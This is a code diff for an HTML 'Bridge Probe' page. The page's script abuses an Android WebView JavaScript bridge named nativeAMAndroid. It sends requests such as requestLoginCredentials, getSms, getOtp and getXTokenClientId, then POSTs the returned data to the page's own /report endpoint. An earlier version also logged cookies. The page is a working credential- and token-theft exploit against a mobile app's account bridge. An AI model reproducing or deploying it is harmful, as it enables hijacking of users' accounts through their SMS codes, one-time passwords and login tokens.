@@ -2,68 +2,54 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Sim Bridge Probe</title>
+<title>Bridge Probe v3</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body { font-family: monospace; background: #111; color: #0f0; padding: 10px; margin: 0; }
+  .out { font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+  .resp { background: #000; border: 2px solid #0f0; border-radius: 8px; padding: 10px; margin: 8px 0; font-size: 21px; word-break: break-all; }
+  .resp .cmd { color: #ff0; font-size: 17px; display: block; margin-bottom: 6px; }
+</style>
 </head>
-<body style="font-family:monospace;background:#111;color:#0f0;padding:10px;font-size:11px;word-break:break-all;">
-<pre id="out">BRIDGE PROBE
-</pre>
+<body>
+<div class="out" id="out">PROBE v3
+</div>
+<div id="resps"></div>
 <script>
 (function () {
     var out = document.getElementById('out');
-
     function log(s) {
         out.textContent += '\n' + s;
-        fetch('/report', {method: 'POST', body: String(s).slice(0, 4000)});
+        try { fetch('/report', {method: 'POST', body: String(s).slice(0, 3000)}); } catch (e) {}
     }
-
     log('URL: ' + location.href);
-    log('UA: ' + navigator.userAgent);
-
-    var keys = Object.getOwnPropertyNames(window).filter(function (k) {
-        return /native|AM|passport|sim|Sim|yandex|Yandex|flutter|Flutter/i.test(k);
-    });
-    log('WINDOW KEYS: ' + keys.join(', '));
-
     var na = window.nativeAMAndroid;
+    log('bridge: ' + (na ? 'FOUND (' + Object.keys(na).join(',') + ')' : 'NOT FOUND'));
+    if (!na) return;
 
-    if (!na) {
-        log('!! nativeAMAndroid NOT FOUND');
-    } else {
-        var methods = [];
-        for (var m in na) methods.push(m + ':' + typeof na[m]);
-        log('nativeAMAndroid methods: ' + methods.join(', '));
+    window.nativeAMResponse = {
+        receive: function (reqId, json) {
+            var cmd = (window.__reqmap || {})[reqId] || reqId.slice(0, 18);
+            var d = document.createElement('div');
+            d.className = 'resp';
+            d.innerHTML = '<span class="cmd">== ' + cmd + '</span>' + String(json).slice(0, 400);
+            document.getElementById('resps').appendChild(d);
+            log('RESP ' + cmd + ' :: ' + String(json).slice(0, 500));
+        }
+    };
 
-        window.nativeAMResponse = {
-            receive: function (reqId, json) {
-                log('<<< RESPONSE ' + reqId + ' :: ' + JSON.stringify(json));
-            }
-        };
-
-        var seq = [
-            {message: 'ready', data: {}},
-            {message: 'requestLoginCredentials', data: {}},
-            {message: 'getSms', data: {}},
-            {message: 'getXTokenClientId', data: {}},
-            {message: 'requestMagicLinkParams', data: {}},
-            {message: 'chooseAccount', data: {}}
-        ];
-
-        seq.forEach(function (msg, i) {
-            setTimeout(function () {
-                var id = 'probe' + i + '_' + Date.now();
-                var payload = {version: 1, message: msg.message, requestId: id, data: msg.data};
-                try {
-                    na.send(JSON.stringify(payload));
-                    log('>>> sent ' + msg.message + ' (' + id + ')');
-                } catch (e) {
-                    log('send error ' + msg.message + ': ' + e);
-                }
-            }, 500 + i * 900);
-        });
-    }
-
-    log('COOKIE: ' + (document.cookie || '(empty)'));
+    window.__reqmap = {};
+    var seq = ['ready', 'requestLoginCredentials', 'getSms', 'chooseAccount', 'getXTokenClientId', 'getOtp'];
+    seq.forEach(function (msg, i) {
+        setTimeout(function () {
+            var id = 'p' + i + '_' + Date.now();
+            window.__reqmap[id] = msg;
+            try {
+                na.send(JSON.stringify({version: 1, message: msg, requestId: id, data: {}}));
+                log('>>> ' + msg);
+            } catch (e) { log('ERR ' + msg + ' ' + e); }
+        }, 600 + i * 1200);
+    });
 })();
 </script>
 </body>
